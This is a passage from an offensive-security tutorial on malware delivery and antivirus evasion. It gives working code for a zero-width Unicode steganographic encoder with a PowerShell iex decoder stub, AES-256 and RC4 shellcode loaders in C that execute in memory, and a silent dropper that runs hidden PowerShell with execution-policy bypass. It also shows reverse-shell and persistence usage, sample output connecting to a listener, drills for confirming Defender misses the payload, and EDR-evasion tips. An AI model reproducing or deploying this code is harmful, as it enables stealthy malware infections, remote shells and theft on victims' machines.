        # A byte is 8 bits. High nibble = top 4 bits. Low nibble = bottom 4 bits.
        # Example: byte 0xAB -> high = 0xA (10), low = 0xB (11)
        high = (byte >> 4) & 0x0F   # shift right 4 bits, mask to 4 bits
        low  =  byte       & 0x0F   # mask to bottom 4 bits

        # Look up the invisible character for each nibble
        encoded.append(GHOST_ALPHABET[high])  # GHOST_ALPHABET[10] = '⁬' (0xA)
        encoded.append(GHOST_ALPHABET[low])   # GHOST_ALPHABET[11] = '⁭' (0xB)

    return ''.join(encoded)  # one giant string of invisible characters
```

So byte `0xFC` (the first byte of most shellcode — the x64 CLD instruction)
becomes two invisible characters: `GHOST_ALPHABET[0xF]` + `GHOST_ALPHABET[0xC]`.
That's `'᠎'` + `'⁮'`. Both render as zero pixels.

A 1KB shellcode (1024 bytes) becomes 2048 invisible characters. The file
looks blank. The payload is all there, encoded 2 characters per byte.

### The Decoder Stub

```python
# ghost_encode.py lines 132-168 — make_ps_decoder_stub()
# This is the VISIBLE part of the output file.
# It's PowerShell code that:
#   1. Reads the invisible characters from the file's here-string
#   2. Rebuilds the GHOST_ALPHABET using explicit Unicode code points
#   3. Builds a reverse lookup table
#   4. Filters the here-string for only known invisible chars
#   5. Reconstructs the original bytes
#   6. Executes the payload via iex or Assembly.Load

def make_ps_decoder_stub(ghost_payload: str, execute_method: str = "iex") -> str:
    # Build alphabet as explicit code points — avoids Unicode combining issues
    # When embedding Unicode chars directly, some editors mangle them
    # Using [char]0x200b is safer than embedding the literal character
    code_points = [hex(ord(c)) for c in GHOST_ALPHABET]
    ps_alphabet = ','.join(f'[char]{cp}' for cp in code_points)
    # ps_alphabet ends up as: "[char]0x200b,[char]0x200c,[char]0x200d,..."
    # PowerShell evaluates [char]0x200b as the actual zero-width space character
```

The stub embedded in every output file (simplified for readability):

```powershell
# This is what the visible portion of ghost.ps1 looks like
# $g contains the invisible payload in a here-string (@'...'@)
$g=@'
[2048 invisible characters here — looks blank]
'@

# Rebuild the 16-character alphabet from explicit code points
# [char]0x200b = U+200B = ZERO WIDTH SPACE, etc.
$a=@([char]0x200b,[char]0x200c,[char]0x200d,[char]0x2060,[char]0x2061,
     [char]0x2062,[char]0x2063,[char]0x2064,[char]0x206a,[char]0x206b,
     [char]0x206c,[char]0x206d,[char]0x206e,[char]0x206f,[char]0xfeff,[char]0x180e)

# Build reverse lookup: char -> index (0-15)
$r=@{}; for($x=0; $x -lt $a.Count; $x++) { $r[$a[$x]] = $x }

# Filter $g — keep only characters that are in our alphabet
# Throws away newlines, whitespace, and any other chars in the here-string
$f = [char[]]$g | ?{ $r.ContainsKey($_) }

# Reconstruct bytes: every 2 chars -> 1 byte
# $f[$i] = high nibble char, $f[$i+1] = low nibble char
$b = New-Object byte[]($f.Count/2)
for($i=0; $i -lt $f.Count; $i+=2) {
    $b[$i/2] = [byte](($r[$f[$i]] * 16) + $r[$f[$i+1]])
}

# Decode bytes to UTF-8 string and execute as PowerShell
iex([System.Text.Encoding]::UTF8.GetString($b))
```

### End-to-End Flow

```
shellcode.ps1 (readable PowerShell)
         |
         v  encode_bytes()
ghost_payload (2048 invisible chars, looks blank)
         |
         v  make_ps_decoder_stub()
ghost.ps1 (visible stub + invisible payload)
         |
         v  Execute on target
PowerShell reads $g (the invisible chars)
Filters to known GHOST_ALPHABET members
Rebuilds bytes two chars at a time
Decodes UTF-8 -> PowerShell string
iex() executes the decoded PowerShell
         |
         v
Original shellcode.ps1 runs in memory
Never touched disk as a plaintext file
```

### Verifying a Ghost File

```python
# ghost_encode.py lines 420-436 — ghost_verify()
# Use this to confirm the file encodes/decodes correctly before deploying

def ghost_verify(ghost_path: str):
    with open(ghost_path, 'r', encoding='utf-8') as f:
        content = f.read()

    # The here-string is between @' and '@
    # Everything between those delimiters is the invisible payload
    start = content.index("@'") + 2
    end   = content.index("'@")
    ghost_data = content[start:end].strip()

    # Decode it back to bytes
    decoded = decode_ghost(ghost_data)

    print(f"Invisible chars found: {sum(1 for c in ghost_data if c in GHOST_REVERSE):,}")
    print(f"Decoded payload: {len(decoded):,} bytes")
    print(f"First 200 chars: {decoded[:200].decode('utf-8', errors='replace')}")
```

### EXPECTED OUTPUT

```
  ╔══════════════════════════════════════╗
  ║  GHOST ENCODER — 22DIV               ║
  ║  Unicode Steganographic Encoder       ║
  ║  What you can't see CAN hurt you.     ║
  ╚══════════════════════════════════════╝

[GHOST] Encoded 312 chars of PowerShell
[GHOST] Output: ghost.ps1 (1,284 bytes)
[GHOST] Invisible chars: 624
```

Verification output:
```
[VERIFY] Ghost file: ghost.ps1
[VERIFY] Invisible chars found: 624
[VERIFY] Decoded payload: 312 bytes
[VERIFY] First 200 chars of decoded payload:
$c=New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444)
$s=$c.GetStream()...
```

### Usage Reference

```bash
# Encode a test payload (harmless — proves execution works)
python ghost_encode.py --test --output ghost_test.ps1

# Encode a reverse shell
python ghost_encode.py --shell 192.168.1.100 4444 --output ghost_shell.ps1

# Encode the full VADER chain (persistence + shell + screen capture)
python ghost_encode.py --vader 192.168.1.100 4444 --output ghost_vader.ps1

# Encode raw PowerShell code
python ghost_encode.py --raw "whoami; hostname" --output ghost_raw.ps1

# Encode an existing .ps1 file
python ghost_encode.py my_payload.ps1 --output ghost.ps1

# Verify the output decodes correctly
python ghost_encode.py --verify ghost.ps1

# Staged payload (connectivity check first, shell only if target is online)
python ghost_encode.py --staged 192.168.1.100 4444 --output ghost_staged.ps1

# Generate a C dropper alongside the ghost .ps1
python ghost_encode.py --shell 192.168.1.100 4444 --output ghost.ps1 --deliver dropper
```

// DRILL: Encode the EICAR test string with ghost_encode.py `--raw`. Open the output file in Notepad — confirm it appears blank. Run it through your AV scanner. Confirm it doesn't get detected. Then run `--verify` on it to prove the payload is intact inside.

```bash
# EICAR test string — standard AV test string, harmless but universally detected
# AV will catch a raw EICAR string immediately. Ghost-encoded: it goes invisible.
python ghost_encode.py --raw 'Write-Host "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"' --output ghost_eicar.ps1

# Scan the output with Defender
"C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File ghost_eicar.ps1
# Expected: No threats found (the EICAR string is invisible inside zero-width characters)

# Verify the payload is still intact
python ghost_encode.py --verify ghost_eicar.ps1
# Expected: Decoded payload shows the EICAR string
```

---

## AES-256 Payload Encryption — Python + C

This section gives you the complete Python encryptor and the matching C
decryptor. Run the Python side once to produce the encrypted blob + key + IV
as C arrays, paste them into the C loader, compile, and the loader decrypts
at runtime.

### Python Side — Encrypt and Output as C Arrays

```python
#!/usr/bin/env python3
"""
aes_encrypt_payload.py — Encrypt shellcode and output as C arrays.
Usage: python aes_encrypt_payload.py shellcode.bin > encrypted_payload.h

Requires: pip install pycryptodome
"""

from Crypto.Cipher import AES           # AES cipher implementation
from Crypto.Util.Padding import pad     # PKCS7 padding
from Crypto.Random import get_random_bytes  # cryptographically secure RNG
import sys
import os

def format_c_array(name: str, data: bytes) -> str:
    """Format a byte array as a C unsigned char declaration."""
    hex_bytes = ', '.join(f'0x{b:02x}' for b in data)
    # Wrap at 16 bytes per line for readability
    lines = []
    chunks = [data[i:i+16] for i in range(0, len(data), 16)]
    formatted = ',\n    '.join(
        ', '.join(f'0x{b:02x}' for b in chunk) for chunk in chunks
    )
    return (
        f"unsigned char {name}[] = {{\n"
        f"    {formatted}\n"
        f"}};\n"
        f"DWORD {name}_len = {len(data)};\n"
    )

def encrypt_shellcode(shellcode_path: str) -> None:
    # Read raw shellcode from file
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    # Generate random 256-bit key (32 bytes) and 128-bit IV (16 bytes)
    key = get_random_bytes(32)   # AES-256 needs a 32-byte key
    iv  = get_random_bytes(16)   # CBC mode needs a 16-byte IV

    # Create AES cipher in CBC mode
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Pad shellcode to block boundary and encrypt
    # PKCS7 padding: if last block needs N bytes, pad with N bytes each of value N
    padded    = pad(shellcode, AES.block_size)   # block_size = 16
    encrypted = cipher.encrypt(padded)

    # Print as C header file — paste into your loader
    print("// AUTO-GENERATED by aes_encrypt_payload.py — do not hand-edit")
    print(f"// Original: {os.path.basename(shellcode_path)} ({len(shellcode)} bytes)")
    print(f"// Encrypted: {len(encrypted)} bytes (padded to 16-byte boundary)")
    print()
    print(format_c_array("enc_shellcode", encrypted))
    print(format_c_array("aes_key", key))
    print(format_c_array("aes_iv", iv))
    print(f"// Decrypt with: AES-256-CBC, key={len(key)*8}bit, iv=16 bytes")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <shellcode.bin>", file=sys.stderr)
        sys.exit(1)
    encrypt_shellcode(sys.argv[1])
```

### EXPECTED OUTPUT

```
// AUTO-GENERATED by aes_encrypt_payload.py — do not hand-edit
// Original: shellcode.bin (272 bytes)
// Encrypted: 288 bytes (padded to 16-byte boundary)

unsigned char enc_shellcode[] = {
    0x4a, 0x8f, 0x2c, 0x11, 0x73, 0xde, 0xa0, 0xf4, 0x1c, 0x88, 0x3e, 0x70, 0xb2, 0x5a, 0x94, 0x0d,
    0xe7, 0x31, 0x6b, 0x2f, ...
};
DWORD enc_shellcode_len = 288;

unsigned char aes_key[] = {
    0x8c, 0x4f, 0x1a, 0x72, 0xe5, 0x3b, 0x09, 0xdc, ...
};
DWORD aes_key_len = 32;

unsigned char aes_iv[] = {
    0xf1, 0x7c, 0x40, 0x2e, 0x8d, 0x93, 0x56, 0xba, ...
};
DWORD aes_iv_len = 16;
```

Redirect the output to a header file:
```bash
python aes_encrypt_payload.py shellcode.bin > payload.h
```

### C Side — Runtime Decryption with Windows CNG

```c
/*
 * aes_loader.c — AES-256-CBC runtime decryptor
 *
 * Compile (MSVC Developer Command Prompt):
 *   cl.exe aes_loader.c /Fe:loader.exe /link bcrypt.lib
 *
 * Compile (MinGW):
 *   gcc aes_loader.c -o loader.exe -lbcrypt
 *
 * IMPORTANT: bcrypt.lib is the Windows CNG library.
 * It is part of the Windows SDK — no extra download needed.
 */

#include <windows.h>      // core Windows API
#include <bcrypt.h>       // Windows Cryptography Next Generation (CNG)
#include <stdio.h>
#include <stdlib.h>

// Include the auto-generated arrays from the Python encryptor
#include "payload.h"      // defines enc_shellcode[], aes_key[], aes_iv[]

/*
 * aes_cbc_decrypt()
 *
 * Decrypts AES-256-CBC ciphertext using Windows CNG.
 * CNG is built into every Windows install — no third-party DLL needed.
 *
 * Parameters:
 *   ct     — pointer to ciphertext bytes
 *   ct_len — length of ciphertext
 *   key    — 32-byte AES-256 key
 *   iv     — 16-byte initialization vector
 *   pt_len — output: length of decrypted plaintext
 *
 * Returns: pointer to heap-allocated plaintext buffer (caller must free())
 */
BYTE* aes_cbc_decrypt(BYTE* ct, DWORD ct_len,
                      BYTE* key, BYTE* iv,
                      DWORD* pt_len) {

    BCRYPT_ALG_HANDLE hAlg = NULL;   // handle to the AES algorithm provider
    BCRYPT_KEY_HANDLE hKey = NULL;   // handle to our specific key object
    BYTE*             pt   = NULL;   // output buffer for plaintext
    NTSTATUS          status;

    // Step 1: Open the AES algorithm provider
    // MS_PRIMITIVE_PROVIDER = built-in Windows CNG primitives
    // NULL = use default algorithm implementation
    // 0    = no flags
    status = BCryptOpenAlgorithmProvider(
        &hAlg,                        // receives the algorithm handle
        BCRYPT_AES_ALGORITHM,         // L"AES" — the algorithm name
        MS_PRIMITIVE_PROVIDER,        // built-in provider (not TPM or hardware HSM)
        0                             // no flags
    );
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // Step 2: Set chaining mode to CBC
    // Must do this BEFORE importing the key
    status = BCryptSetProperty(
        hAlg,                         // the algorithm handle
        BCRYPT_CHAINING_MODE,         // property name
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC,// L"ChainingModeCBC"
        sizeof(BCRYPT_CHAIN_MODE_CBC),// length of the property value
        0                             // no flags
    );
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // Step 3: Import the key bytes into a CNG key object
    // BCryptGenerateSymmetricKey takes raw key bytes and wraps them in a BCRYPT_KEY_HANDLE
    // The key_obj_buf parameter can be NULL — CNG will allocate internally
    status = BCryptGenerateSymmetricKey(
        hAlg,        // algorithm provider
        &hKey,       // receives the key handle
        NULL,        // key object buffer (NULL = let CNG allocate)
        0,           // key object buffer size
        key,         // our raw 32-byte key
        32,          // key size in bytes (256 bits)
        0            // no flags
    );
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // Step 4: First call to BCryptDecrypt — get output size
    // Pass NULL for output buffer and 0 for output size
    // CNG writes the required output size into pt_len
    status = BCryptDecrypt(
        hKey,              // key handle
        ct, ct_len,        // input: ciphertext
        NULL,              // padding info (NULL = default PKCS7)
        iv, 16,            // initialization vector (MODIFIED IN PLACE — make a copy if reusing)
        NULL, 0,           // output: NULL = just get the size
        pt_len,            // receives required output buffer size
        BCRYPT_BLOCK_PADDING  // flag: use PKCS7 block padding (strips it during decrypt)
    );
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // Step 5: Allocate the output buffer
    pt = (BYTE*)malloc(*pt_len);
    if (!pt) goto cleanup;

    // Step 6: Second call to BCryptDecrypt — actually decrypt
    // NOTE: BCryptDecrypt CONSUMES the IV — it modifies the iv buffer.
    // If you need to decrypt multiple blocks with the same IV,
    // make a copy of iv before each call.
    status = BCryptDecrypt(
        hKey,
        ct, ct_len,
        NULL,
        iv, 16,
        pt, *pt_len,          // output: plaintext buffer + size
        pt_len,               // updated to actual bytes written
        BCRYPT_BLOCK_PADDING  // strips PKCS7 padding from the last block
    );
    if (!BCRYPT_SUCCESS(status)) {
        free(pt);
        pt = NULL;
    }

cleanup:
    // Always destroy key and close algorithm handle — prevent handle leaks
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return pt;   // NULL on failure, pointer to plaintext on success
}

int main(void) {
    BYTE*  shellcode     = NULL;  // decrypted shellcode
    DWORD  shellcode_len = 0;     // length after decryption + padding strip

    // Decrypt at runtime — the plaintext shellcode is NEVER on disk
    shellcode = aes_cbc_decrypt(
        enc_shellcode, enc_shellcode_len,  // from payload.h
        aes_key,                           // 32-byte key, from payload.h
        aes_iv,                            // 16-byte IV, from payload.h
        &shellcode_len
    );

    if (!shellcode) {
        // Decryption failed — exit silently (no console window with WinMain)
        return 1;
    }

    // Allocate RW (not RWX) memory for the shellcode
    // Allocating RWX directly is a strong behavioral indicator — separate the steps
    LPVOID exec_mem = VirtualAlloc(
        NULL,            // let Windows choose the address
        shellcode_len,   // size of allocation
        MEM_COMMIT | MEM_RESERVE,  // commit pages immediately
        PAGE_READWRITE   // start as read-write, not executable
    );
    if (!exec_mem) { free(shellcode); return 1; }

    // Copy decrypted shellcode into the allocated region
    memcpy(exec_mem, shellcode, shellcode_len);

    // Zero out the heap buffer — plaintext shellcode gone from heap
    SecureZeroMemory(shellcode, shellcode_len);
    free(shellcode);

    // Change memory permissions: RW -> RX (read + execute, NOT write)
    // EDR watches this VirtualProtect call — the RW->RX transition is a signal
    // For better evasion, use NtProtectVirtualMemory directly (lower level)
    DWORD old_protect = 0;
    VirtualProtect(exec_mem, shellcode_len, PAGE_EXECUTE_READ, &old_protect);

    // Execute the shellcode via function pointer cast
    // Equivalent to: call rax (where rax = exec_mem)
    ((void(*)())exec_mem)();

    return 0;
}
```

### Compile Commands

```powershell
# MSVC (from Developer Command Prompt — Start -> "Developer Command Prompt for VS 2022")
cl.exe aes_loader.c /Fe:loader.exe /link bcrypt.lib
# Expected: Microsoft compiler output, then "loader.exe" created

# MinGW (from any PowerShell/CMD with gcc on PATH)
gcc aes_loader.c -o loader.exe -lbcrypt
# Expected: no output on success, loader.exe created

# Verify the binary exists
Get-Item loader.exe | Select Name, Length
# Expected: loader.exe  [some size in bytes]

# Test in a VM — run and confirm it doesn't crash immediately
# (with real shellcode it will execute — use a test shellcode first)
```

### EXPECTED OUTPUT (test compilation)

```
Microsoft (R) C/C++ Optimizing Compiler Version 19.xx for x64
Copyright (C) Microsoft Corporation. All rights reserved.

aes_loader.c
Microsoft (R) Incremental Linker Version 14.xx
/out:loader.exe
bcrypt.lib
```

**Failure: `fatal error C1083: Cannot open include file: 'bcrypt.h'`**
This means the Windows SDK is not installed. Install via Visual Studio Installer:
Workload "Desktop development with C++" includes the Windows SDK.

**Failure: `LINK : fatal error LNK1181: cannot open input file 'bcrypt.lib'`**
You're compiling outside the Developer Command Prompt. Open "Developer Command
Prompt for VS 2022" from the Start menu — it sets up the correct LIB path.

// DRILL: Generate a test shellcode with msfvenom (`msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o shellcode.bin`). Encrypt it with the Python script. Paste the arrays into the C loader. Compile. Run in a VM. Confirm calc.exe opens.

---

## RC4 — Minimal Keystream (32-byte implementation in C)

RC4 has one advantage over AES: it needs zero library dependencies.
No bcrypt.lib, no CNG, no includes beyond `<string.h>`. The entire
implementation is ~30 lines of C. This is valuable in constrained
environments: shellcode stubs, position-independent loaders, payloads
where binary size matters.

### The Two Phases of RC4

**Phase 1 — Key Scheduling Algorithm (KSA)**:
Initializes a 256-byte state array using the key. This scrambles the
array into a pseudo-random permutation that is unique to the key.

**Phase 2 — Pseudo-Random Generation Algorithm (PRGA)**:
Generates a keystream byte by byte. Each keystream byte is XOR'd with
one plaintext byte. Decryption is the same operation — XOR is its own
inverse.

### Complete RC4 in C — 32-byte Key

```c
/*
 * rc4_loader.c — RC4 runtime decryptor, no external dependencies
 *
 * Compile (MSVC):
 *   cl.exe rc4_loader.c /Fe:rc4_loader.exe
 *
 * Compile (MinGW):
 *   gcc rc4_loader.c -o rc4_loader.exe
 *
 * Note: No /link bcrypt.lib needed — pure C, no Windows crypto APIs
 */

#include <windows.h>
#include <string.h>   // memcpy, memset

/* -----------------------------------------------------------------------
 * RC4 state and key schedule
 * ----------------------------------------------------------------------- */

#define RC4_KEY_LEN 32    /* 32 bytes = 256-bit key. Can be 1-256 bytes. */

typedef struct {
    unsigned char S[256];  /* state array — 256 bytes, always contains 0-255 */
    unsigned int  i, j;    /* PRGA indices — tracked between calls */
} RC4_CTX;

/*
 * rc4_init() — Key Scheduling Algorithm (KSA)
 *
 * Initializes the state array S with the key.
 * After this runs, S is a pseudo-random permutation of 0-255,
 * determined entirely by the key.
 */
void rc4_init(RC4_CTX* ctx, const unsigned char* key, unsigned int key_len) {
    unsigned int i, j;
    unsigned char tmp;

    /* Initialize S as identity permutation: S[i] = i */
    for (i = 0; i < 256; i++) {
        ctx->S[i] = (unsigned char)i;
    }

    /* KSA: shuffle S using the key bytes */
    j = 0;
    for (i = 0; i < 256; i++) {
        /* j advances based on key byte — key drives the shuffle */
        j = (j + ctx->S[i] + key[i % key_len]) & 0xFF;  /* % 256 = & 0xFF (faster) */

        /* Swap S[i] and S[j] — this is the shuffle */
        tmp      = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = tmp;
    }

    /* Reset PRGA indices */
    ctx->i = 0;
    ctx->j = 0;
}

/*
 * rc4_crypt() — Pseudo-Random Generation Algorithm (PRGA)
 *
 * Generates keystream bytes and XORs them with data.
 * Call with plaintext -> produces ciphertext.
 * Call again with ciphertext (same ctx, same key) -> produces plaintext.
 * Same function, both directions. XOR is its own inverse.
 */
void rc4_crypt(RC4_CTX* ctx, unsigned char* data, unsigned int data_len) {
    unsigned int i, j;
    unsigned char tmp, k;

    i = ctx->i;   /* restore PRGA state from context */
    j = ctx->j;

    while (data_len--) {
        /* Advance indices */
        i = (i + 1) & 0xFF;           /* i increments by 1 each byte */
        j = (j + ctx->S[i]) & 0xFF;   /* j advances by S[i] — non-linear */

        /* Swap S[i] and S[j] — modifies the state for each byte */
        tmp      = ctx->S[i];
        ctx->S[i] = ctx->S[j];
        ctx->S[j] = tmp;

        /* Generate keystream byte: S[(S[i] + S[j]) mod 256] */
        k = ctx->S[(ctx->S[i] + ctx->S[j]) & 0xFF];

        /* XOR data byte with keystream byte — encryption/decryption */
        *data++ ^= k;
    }

    ctx->i = i;   /* save PRGA state back to context (allows streaming) */
    ctx->j = j;
}

/* -----------------------------------------------------------------------
 * Encrypted payload (output from rc4_encrypt_payload.py)
 * Replace these placeholder arrays with real encrypted shellcode
 * ----------------------------------------------------------------------- */

/* 32-byte RC4 key — generate with: python -c "import os; print(list(os.urandom(32)))" */
unsigned char rc4_key[RC4_KEY_LEN] = {
    0x4a, 0x8f, 0x2c, 0x11, 0x73, 0xde, 0xa0, 0xf4,
    0x1c, 0x88, 0x3e, 0x70, 0xb2, 0x5a, 0x94, 0x0d,
    0xe7, 0x31, 0x6b, 0x2f, 0x09, 0xc4, 0x57, 0x82,
    0xd3, 0x1e, 0x46, 0x7a, 0xb5, 0x23, 0xf8, 0x60
    /* replace with output from your Python encryptor */
};

/* RC4-encrypted shellcode — generated by: python rc4_encrypt_payload.py shellcode.bin */
unsigned char enc_payload[] = {
    0x8b, 0x3f, 0x7c, 0x1d, 0x2e, /* ... replace with real encrypted bytes ... */
};
DWORD enc_payload_len = sizeof(enc_payload);

/* -----------------------------------------------------------------------
 * Main loader
 * ----------------------------------------------------------------------- */

int main(void) {
    RC4_CTX ctx;

    /* Initialize RC4 with the key — runs KSA, sets up state array */
    rc4_init(&ctx, rc4_key, RC4_KEY_LEN);

    /* Allocate RW memory for the shellcode */
    LPVOID mem = VirtualAlloc(NULL, enc_payload_len,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 1;

    /* Copy encrypted shellcode into allocated buffer */
    memcpy(mem, enc_payload, enc_payload_len);

    /* Decrypt IN PLACE — rc4_crypt() overwrites the buffer */
    /* After this call, mem contains the original plaintext shellcode */
    rc4_crypt(&ctx, (unsigned char*)mem, enc_payload_len);

    /* Flip permissions to executable */
    DWORD old;
    VirtualProtect(mem, enc_payload_len, PAGE_EXECUTE_READ, &old);

    /* Execute */
    ((void(*)())mem)();

    return 0;
}
```

### Python RC4 Encryptor (companion script)

```python
#!/usr/bin/env python3
"""
rc4_encrypt_payload.py — Encrypt shellcode with RC4 and output as C arrays.
Usage: python rc4_encrypt_payload.py shellcode.bin
"""

import sys
import os

def rc4(key: bytes, data: bytes) -> bytes:
    """RC4 in pure Python — same algorithm as the C implementation above."""
    S = list(range(256))
    j = 0
    # KSA
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    # PRGA
    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def format_c_array(name: str, data: bytes) -> str:
    chunks = [data[i:i+8] for i in range(0, len(data), 8)]
    body = ',\n    '.join(', '.join(f'0x{b:02x}' for b in c) for c in chunks)
    return f"unsigned char {name}[] = {{\n    {body}\n}};\nDWORD {name}_len = {len(data)};\n"

if __name__ == '__main__':
    shellcode_path = sys.argv[1]
    with open(shellcode_path, 'rb') as f:
        shellcode = f.read()

    # Generate a 32-byte random key
    key = os.urandom(32)
    encrypted = rc4(key, shellcode)

    # Verify round-trip before output
    assert rc4(key, encrypted) == shellcode, "RC4 round-trip failed"

    print("// RC4-encrypted shellcode — generated by rc4_encrypt_payload.py")
    print(format_c_array("rc4_key", key))
    print(format_c_array("enc_payload", encrypted))
```

### XOR vs RC4 vs AES — Comparison

| Property | XOR (4-byte key) | RC4 (32-byte key) | AES-256-CBC |
|----------|-----------------|-------------------|-------------|
| Key size | 1-N bytes | 1-256 bytes | 128/192/256 bits |
| C code size | ~10 lines | ~35 lines | 50+ lines (CNG) or external lib |
| Library dependency | None | None | bcrypt.lib (Windows) |
| Cryptographic strength | WEAK — brute-forceable | Adequate for obfuscation | Strong |
| Entropy of output | Same as input | High (~7.9) | Maximum (~7.99) |
| AV brute-force resistance | None (256 keys for 1-byte) | High (2^256 keys) | Very high (2^256 keys) |
| Speed | Fastest | Fast | Slightly slower |
| Streaming capable | Yes | Yes | No (block cipher) |
| Use case | Dead. Don't bother. | Shellcode obfuscation, small loaders | Serious payload encryption |

**Bottom line**: Use RC4 when binary size and zero-dependency matter most.
Use AES-256 when you need maximum cryptographic strength and can afford
the bcrypt.lib dependency. Never use XOR with a short key — it's theater.

// DRILL: Encrypt the same shellcode.bin three ways: XOR (single-byte key 0xAA), RC4 (32-byte random key), AES-256-CBC. Run `shannon_entropy()` on all three outputs. Print a table. Confirm AES has the highest entropy and is therefore most likely to be flagged by entropy analysis.

---

## Building ghost_dropper.c — Full Walkthrough

The Ghost Encoder generates a `ghost_dropper.c` source file when you
run with `--deliver dropper`. This is a standalone Windows EXE that:
1. Copies `ghost.ps1` from its own directory to `%TEMP%`
2. Launches PowerShell hidden to execute it
3. Shows no window, no console, no UAC prompt

This is the delivery mechanism. The user double-clicks `dropper.exe`,
nothing visible happens, and the ghost payload executes silently.

### Source Code — Every Line Explained

```c
/*
 * ghost_dropper.c — Silent delivery EXE for ghost.ps1
 *
 * Compile (MSVC):
 *   cl.exe ghost_dropper.c /Fe:dropper.exe /link user32.lib
 *
 * Compile (MinGW — produces no console window):
 *   gcc ghost_dropper.c -o dropper.exe -mwindows
 *
 * The -mwindows flag (MinGW) or the WinMain entry point (instead of main)
 * is what suppresses the console window. Without it, a black CMD window
 * flashes briefly on execution — a giveaway to observant users.
 */

#include <windows.h>   /* WinMain, GetTempPathA, GetModuleFileNameA, etc. */
#include <stdio.h>     /* snprintf */

/*
 * WinMain — Windows GUI entry point
 *
 * Using WinMain instead of main() is the key to hiding the console.
 * main() creates a console window process (subsystem: CONSOLE).
 * WinMain creates a GUI process (subsystem: WINDOWS).
 * GUI processes have no console window by default.
 *
 * Parameters (required by Windows, we don't use them):
 *   hInstance     — handle to this executable's instance
 *   hPrevInstance — always NULL (legacy, pre-Win32)
 *   lpCmdLine     — command line string (without executable name)
 *   nCmdShow      — requested initial window state (SW_NORMAL, SW_HIDE, etc.)
 */
int WINAPI WinMain(HINSTANCE hInstance,
                   HINSTANCE hPrevInstance,
                   LPSTR     lpCmdLine,
                   int       nCmdShow) {

    char temp_dir[MAX_PATH];    /* path to %TEMP% directory */
    char dest_ps1[MAX_PATH];    /* full path to destination ghost.ps1 */
    char src_dir[MAX_PATH];     /* directory containing dropper.exe */
    char src_ps1[MAX_PATH];     /* full path to source ghost.ps1 */
    char cmd_line[2048];        /* PowerShell command line to execute */

    /* Step 1: Get the %TEMP% directory path
     *
     * GetTempPathA() returns the path to the user's temp folder.
     * Example: "C:\Users\george\AppData\Local\Temp\"
     * The trailing backslash is included.
     * MAX_PATH = 260 (max Windows path length)
     */
    GetTempPathA(MAX_PATH, temp_dir);

    /* Step 2: Build the destination path for ghost.ps1 in %TEMP%
     *
     * snprintf is safer than sprintf — won't overflow the buffer.
     * Result: "C:\Users\george\AppData\Local\Temp\ghost.ps1"
     *
     * The filename "ghost.ps1" is hardcoded here — it must match
     * the output filename passed to ghost_encode.py.
     */
    snprintf(dest_ps1, MAX_PATH, "%sghost.ps1", temp_dir);

    /* Step 3: Find the directory containing dropper.exe itself
     *
     * GetModuleFileNameA(NULL, ...) returns the full path to the current EXE.
     * Example: "C:\Users\george\Downloads\dropper.exe"
     *
     * We want just the directory, not the filename.
     * strrchr(path, '\\') finds the LAST backslash in the path.
     * Setting *(slash+1) = 0 truncates there, leaving "C:\Users\george\Downloads\"
     */
    GetModuleFileNameA(NULL, src_dir, MAX_PATH);
    char* last_slash = strrchr(src_dir, '\\');
    if (last_slash) {
        *(last_slash + 1) = '\0';   /* truncate after the last backslash */
    }
    /* src_dir is now "C:\Users\george\Downloads\" */

    /* Step 4: Build the source path for ghost.ps1 (next to dropper.exe)
     *
     * The assumption: ghost.ps1 is in the same directory as dropper.exe.
     * This is the expected deployment structure:
     *   Downloads\
     *     dropper.exe
     *     ghost.ps1    <- the encoded payload
     */
    snprintf(src_ps1, MAX_PATH, "%sghost.ps1", src_dir);

    /* Step 5: Copy ghost.ps1 to %TEMP%
     *
     * CopyFileA(src, dest, fail_if_exists)
     * Third parameter FALSE: overwrite if file already exists.
     * Writing to %TEMP% doesn't require admin rights.
     * This creates a second copy at a less suspicious path.
     *
     * Why copy to %TEMP%? Running from Downloads\ is more suspicious.
     * %TEMP% is where many legitimate apps put temporary files.
     */
    CopyFileA(src_ps1, dest_ps1, FALSE);

    /* Step 6: Build the PowerShell command line
     *
     * -WindowStyle Hidden  : PowerShell window starts minimized and hidden
     * -ExecutionPolicy Bypass : bypasses script execution policy (no admin needed)
     *                           This is a USER-LEVEL bypass, not system-wide
     * -File "path"         : run this script file (not a command string)
     *
     * The full command must be quoted because dest_ps1 may contain spaces
     * (e.g., "C:\Users\george wu\AppData\..." has a space in "george wu").
     *
     * snprintf writes: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\...\ghost.ps1"
     */
    snprintf(cmd_line, sizeof(cmd_line),
             "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%s\"",
             dest_ps1);

    /* Step 7: Set up STARTUPINFOA for a hidden process
     *
     * STARTUPINFOA controls how the new process window appears.
     * Zero-initialize it with {sizeof(si)} — clears all fields, sets dwSize.
     *
     * dwFlags = STARTF_USESHOWWINDOW
     *   Tells Windows to use the wShowWindow field below.
     *   Without this flag, wShowWindow is IGNORED.
     *
     * wShowWindow = SW_HIDE
     *   The process starts with its main window hidden.
     *   Even if PowerShell tries to show a window, it won't appear.
     */
    STARTUPINFOA si = { sizeof(si) };       /* zero-init, set dwSize */
